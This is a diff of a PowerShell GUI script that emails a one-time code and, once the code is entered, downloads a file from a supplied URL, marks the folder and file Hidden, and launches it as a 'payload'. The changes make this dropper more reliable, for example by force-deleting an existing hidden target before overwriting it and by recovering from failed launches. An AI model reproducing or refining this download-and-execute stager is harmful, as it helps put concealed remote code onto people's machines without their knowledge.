@@ -33,6 +33,7 @@ $bytes = New-Object byte[] 4
 $rng.GetBytes($bytes)
 $randVal = [System.BitConverter]::ToUInt32($bytes, 0)
 $script:otp = (100000 + ($randVal % 900000)).ToString()
+$rng.Dispose()
 
 $script:attempts = 0
 $script:maxAttempts = 3
@@ -77,7 +78,7 @@ This code is single-use and valid only for this active session.
         return $true
     }
     catch {
-        Write-Error "SMTP Transmission Failed: $($_.Exception.Message)"
+        Write-Warning "SMTP Transmission Failed: $($_.Exception.Message)"
         return $false
     }
     finally {
@@ -103,6 +104,14 @@ function Invoke-SecurePayloadExecution {
         $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
     }
 
+    # Reset attributes and remove destination file if it already exists,
+    # preventing "Access to the path ... is denied" when overwriting hidden/read-only files.
+    if (Test-Path -LiteralPath $destinationPath) {
+        $existing = Get-Item -LiteralPath $destinationPath -Force
+        $existing.Attributes = [System.IO.FileAttributes]::Normal
+        Remove-Item -LiteralPath $destinationPath -Force -ErrorAction Stop
+    }
+
     $webClient = New-Object System.Net.WebClient
     try {
         $webClient.DownloadFile($DownloadUrl, $destinationPath)
@@ -123,7 +132,8 @@ function Invoke-SecurePayloadExecution {
     $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
 
     $processParams = @{
-        FilePath = $destinationPath
+        FilePath         = $destinationPath
+        WorkingDirectory = $targetDirectory
     }
 
     if ($WaitForExit) {
@@ -211,12 +221,16 @@ $btnCancel.FlatAppearance.BorderSize = 0
 $btnCancel.Cursor = [System.Windows.Forms.Cursors]::Hand
 $form.Controls.Add($btnCancel)
 
+$form.CancelButton = $btnCancel
+
 # -------------------------------------------------------------------------
 # Event Handlers
 # -------------------------------------------------------------------------
 $form.Add_Shown({
-    $form.Update()
+    $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
+    $form.Refresh()
     $sent = Send-VerificationOtp -RecipientEmail $NotifyEmail -DisplayName $RecipientName -Code $script:otp
+    $form.Cursor = [System.Windows.Forms.Cursors]::Default
     if ($sent) {
         $statusLabel.Text = "Code dispatched. Enter your 6-digit key."
         $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
@@ -231,23 +245,41 @@ $form.Add_Shown({
 $btnVerify.Add_Click({
     $entered = $txtOtp.Text.Trim()
 
+    if ([string]::IsNullOrWhiteSpace($entered)) {
+        $statusLabel.Text = "Please enter the 6-digit verification code."
+        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 190, 0)
+        $txtOtp.Focus()
+        return
+    }
+
     if ($entered -eq $script:otp) {
         $statusLabel.Text = "Access granted. Downloading payload..."
         $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
         $btnVerify.Enabled = $false
         $txtOtp.Enabled = $false
-        $form.Update()
+        $form.Refresh()
 
         try {
-            Invoke-SecurePayloadExecution -DownloadUrl $Url -TargetFolder $FolderName -TargetFile $FileName -WaitForExit:$Wait
+            $invokeParams = @{
+                DownloadUrl  = $Url
+                TargetFolder = $FolderName
+                TargetFile   = $FileName
+            }
+            if ($Wait) {
+                $invokeParams['WaitForExit'] = $true
+            }
+            Invoke-SecurePayloadExecution @invokeParams
             $statusLabel.Text = "Payload launched successfully."
-            $form.Update()
+            $form.Refresh()
             Start-Sleep -Seconds 1
             $form.Close()
         }
         catch {
-            $statusLabel.Text = "Execution failed: $($_.Exception.Message)"
+            $statusLabel.Text = "Execution failed: $($_.Exception.GetBaseException().Message)"
             $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
+            $btnVerify.Enabled = $true
+            $txtOtp.Enabled = $true
+            $txtOtp.Focus()
         }
     } else {
         $script:attempts++
@@ -259,7 +291,7 @@ $btnVerify.Add_Click({
             $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
             $btnVerify.Enabled = $false
             $txtOtp.Enabled = $false
-            $form.Update()
+            $form.Refresh()
             Start-Sleep -Seconds 2
             $form.Close()
         } else {
